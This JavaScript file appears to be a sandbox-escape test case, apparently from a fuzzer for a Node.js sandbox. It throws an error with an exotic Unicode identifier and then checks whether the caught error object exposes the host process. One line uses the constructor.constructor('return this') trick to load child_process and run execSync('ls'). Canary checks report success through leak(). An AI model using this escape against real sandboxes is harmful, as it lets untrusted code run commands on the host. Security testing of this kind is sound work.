try {
    var _ࣿఀಁഁ෦෧෨෩෪෫෬෭෮෯᪵᪶᪷᪸᪹᪺᪽᪰᪱᪲᪳᪴᪻᪼᳸᳹ᷧᷨᷩᷪᷫᷬᷭᷮᷯᷰᷱᷲᷳᷴ᷵ꧥ꧰꧱꧲꧳꧴꧵꧶꧷꧸꧹ꩼꩽ𑅳𑁿︧︨︩︪︫︬︭𐋠𐫦𐍶𐍷𐍸𐍹𐍺𐫥𑈬𑈭𑈮𑈯𑈰𑈱𑈲𑈳𑈴𑈶𑈵𑈷𑋟𑋠𑋡𑋢𑋣𑋤𑋥𑋦𑋧𑋨𑋩𑋪𑋰𑋱𑋲𑋳𑋴𑋵𑋶𑋷𑋸𑋹𑌁𑌂𑌃𑌼𑌾𑌿𑍀𑍁𑍂𑍃𑍄𑍇𑍈𑍋𑍌𑍍𑍗𑍢𑍣𑍦𑍧𑍨𑍩𑍪𑍫𑍬𑍰𑍱𑍲𑍳𑍴𑒰𑒱𑒲𑒳𑒴𑒵𑒶𑒷𑒸𑒻𑒻𑒼𑒽𑒾𑒿𑓀𑓁𑓃𑓂𑓐𑓑𑓒𑓓𑓔𑓕𑓖𑓗𑓘𑓙𑖯𑖰𑖱𑖲𑖳𑖴𑖵𑖸𑖹𑖺𑖻𑖼𑖽𑖾𑗀𑖿𑘰𑘱𑘲𑘳𑘴𑘵𑘶𑘷𑘸𑘹𑘺𑘻𑘼𑘽𑘾𑘿𑙀𑙐𑙑𑙒𑙓𑙔𑙕𑙖𑙗𑙘𑙙𑣠𑣡𑣢𑣣𑣤𑣥𑣦𑣧𑣨𑣩𖩠𖩡𖩢𖩣𖩤𖩥𖩦𖩧𖩨𖩩𖫰𖫱𖫲𖫳𖫴𖬰𖬱𖬲𖬳𖬴𖬵𖬶𖭐𖭑𖭒𖭓𖭔𖭕𖭖𖭗𖭘𖭙𛲝𛲞𞣐𞣑𞣒𞣓𞣔𞣕𞣖;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}